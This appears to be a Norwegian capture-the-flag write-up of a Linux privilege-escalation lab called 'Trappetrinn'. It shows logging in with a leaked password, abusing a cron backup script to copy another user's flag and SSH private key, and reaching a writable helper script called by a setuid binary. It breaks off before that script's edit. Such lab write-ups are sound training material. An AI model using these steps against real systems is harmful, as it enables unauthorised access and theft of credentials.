# Trappetrinn

Oppgave: 
```
login@corax ~/2_Oppdrag/2.1_Trappetrinn $ cat LESMEG.md 
Vi har avdekket en mulig bedrift som kan være knyttet til Utlandia, og har funnet et av passordene til en av de ansatte i en offentlig tilgjengelig, lekket database.
Det er ditt oppdrag å innhente informasjon som avklarer om det foreligger en slik tilknytning eller ikke.
Passordet er Bubbles2021

'''
ssh sarah@trappetrinn
'''
```

Her er det bare å logge seg på som sarah og se hva vi finer:

## Sara
```
sarah@trappetrinn:~$ ls -al
total 16
drwxr-x---. 1 sarah sarah   37 Jan  4 14:37 .
drwxr-xr-x. 1 root  root    45 Dec 19 15:39 ..
-rw-r--r--. 1 sarah sarah  220 Jan  6  2022 .bash_logout
-rw-r--r--. 1 sarah sarah 3771 Jan  6  2022 .bashrc
drwx------. 2 sarah sarah   34 Jan  4 14:37 .cache
-rw-r--r--. 1 sarah sarah  807 Jan  6  2022 .profile
-rw-r--r--. 1 sarah sarah   33 Jan  4 12:55 sarah.txt

sarah@trappetrinn:~$ cat sarah.txt 
FLAGG 
```

Her finner vi saraah.txt som innholder flagget vi kan levere inn. Filnanvnet kan også ha muligheten til å hjelpe oss videre, for vi skal nok finne, david.txt, priya.txt og root.txt.
Men nå må vi lete litt, for hvordan skal vi få kommet oss videre, og få "bedre" rettigheter. La oss liste opp bare filer vi kan skrive til med "find / -writable -type f 2>/dev/null".

```
sarah@trappetrinn:/etc$ find / -writable -type f 2>/dev/null
/opt/projects/projectAtla/backup/filesToBackup
/opt/projects/projectAtla/projectPlan.txt
/opt/projects/projectAtla/NoteFromDavid.md

sarah@trappetrinn:~$ cd /opt/projects/projectAtla/

sarah@trappetrinn:~$ cat NoteFromDavid.md
Sarah,

I've set up a temporary backup script for important files related to the project.
It runs automatically every minute.

The script reads the path to back up from the 'filesToBackup' file in the backup folder.
If you want to back up any files, just add them to that file.
Make sure there is a newline between the file paths though, or it won't work.

It's just a simple hack until I get the proper backup runner finished.

— David
```

Dette er akkurat det vi trenger, en "cron job" som kjører ett script som eies av David kan sikkert hente ut david.txt!! Det er i vertallf det jeg håper på! 
Så jeg prøver på akkurat det, lese ut david.txt

```
sarah@trappetrinn:/etc$ cd /opt/projects/projectAtla

nano:
GNU nano 6.2  filesToBackup
/opt/projects/projectAtla/projectPlan.txt
/home/david/david.txt

....  A FEW MOMENTS LATER  ....

sarah@trappetrinn:/opt/projects/projectAtla/backup/files$ ls
david.txt  projectPlan.txt

sarah@trappetrinn:/opt/projects/projectAtla/backup/files$ cat david.txt
FLAGG
```

Hurra !!! Det funket som bare det, men det var ikke noe hint i david.txt om veien videre. Så la oss heller se om vi kan få logget in som David.. 
Siden vi har nå muliget til å hente ut filer som er David sine, la oss hente ut SSH nøkkel. 

```
sarah@trappetrinn:/opt/projects/projectAtla/backup/files$ ls
david.txt  id_rsa  projectPlan.txt

sarah@trappetrinn:/opt/projects/projectAtla/backup/files$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEArceViBNlqPYZ8QihU3WNtAYRExu5T0E+m6FD0lobD57qUbU4FeVy
I71Xb/OgQl5gzPQJK4OG8vukkR7wuGmVgdHCDXqii+RdZHdq6OUYG5NZpTcqDxgBDjnjOL
....
...
...
h+E/v5i/x5F4fZfZMv20GrCTgR1p0w/8piF90rrVB5vbG5w5IzUdQRygbQlw0Pi3yjim7a
SRHODKHsMQmtA7AAABAQC1g4HzClARTVOrkFOmREsFPF/GHngGBRYe6Ql6kjIMsav61bO6
wz3RZboYlkGRPQYHoj0H2CwjyNZR7oNIeSZhG9WzVO8qT2Gv4zqLVUpJKW5EGHoiohm5eQ
3B3nA7Xy0sAynhb+2xOZE8+1ALSL1WVipNBbzFx8cHJqF7Sd3ORpa4+2VjBIBdT0gq0Hsf
jQHYZW75xXEqQBXuBu0utmN4WJLwekS1yOX1UIQP0KJEVasW0m4YDLSw4wSFxJK+hn3pBj
YCAq3DoPbT/w2jOww9MhNXzpLfGXrgrQUfb7LEiTsdCGAbjoamjcDqwFDhAExrOUxcxTyZ
oCce3oLJo763AAAACm9vZ3dheUBOcGM=
-----END OPENSSH PRIVATE KEY-----


sarah@trappetrinn:/tmp$ nano rsa_key
sarah@trappetrinn:/tmp$ chmod 600 rsa_key
sarah@trappetrinn:/tmp$ ssh -i rsa_key david@trappetrinn
```

Volla! Vi er nå logget inn som David !! Vi gjør akkuarat det samme som vi gjorde hos Sarah -> find / -writable -type f 2>/dev/null

```
david@trappetrinn:~$ find / -writable -type f 2>/dev/null
/opt/senior-tools/helper-scripts/NoteFromPriya.md
/opt/senior-tools/helper-scripts/helper.sh

david@trappetrinn:~$ cd /opt/senior-tools
david@trappetrinn:/opt/senior-tools$ ls -al
total 0
drwxrwx---. 1 priya seniorteam 28 Dec 19 15:39 .
drwxr-xr-x. 1 root  root       22 Dec 19 15:39 ..
drwxr-xr-x. 1 root  root       23 Dec 19 15:39 helper-scripts
drwxrwx---. 1 priya seniorteam 23 Dec 19 15:39 programs
drwxrwx---. 2 priya seniorteam  6 Dec 19 15:39 scripts

david@trappetrinn:/opt/senior-tools/programs$ cd helper-scripts/
david@trappetrinn:/opt/senior-tools/programs$ cat NoteFromPriya.md
David,

This is a folder to put helper scripts into.
Mainly smaller scripts that perform specific functions that you can use with bigger scripts or programs.
For example, the runTask program I made, which makes use of helper.sh. 
It just helps save us some time not having to recode everything.

— Priya

david@trappetrinn:/opt/senior-tools$ ls -al programs/
total 20
drwxrwx---. 1 priya seniorteam    23 Dec 19 15:39 .
drwxrwx---. 1 priya seniorteam    28 Dec 19 15:39 ..
-rwsr-x---. 1 priya seniorteam 15960 Dec 18 10:18 runTask
-rwsr-x---. 1 priya seniorteam   147 Dec 18 10:18 runTask.c

david@trappetrinn:/opt/senior-tools$ cat programs/runTask.c
#include <stdlib.h>
#include <unistd.h>

int main() {
    execl("/opt/senior-tools/helper-scripts/helper.sh", "helper.sh", NULL);

    return 0;
}

```

La oss redigere litt på helper.sh og se om vi kan gjøre nesten akkurat det samme som på David

´´´



´´´




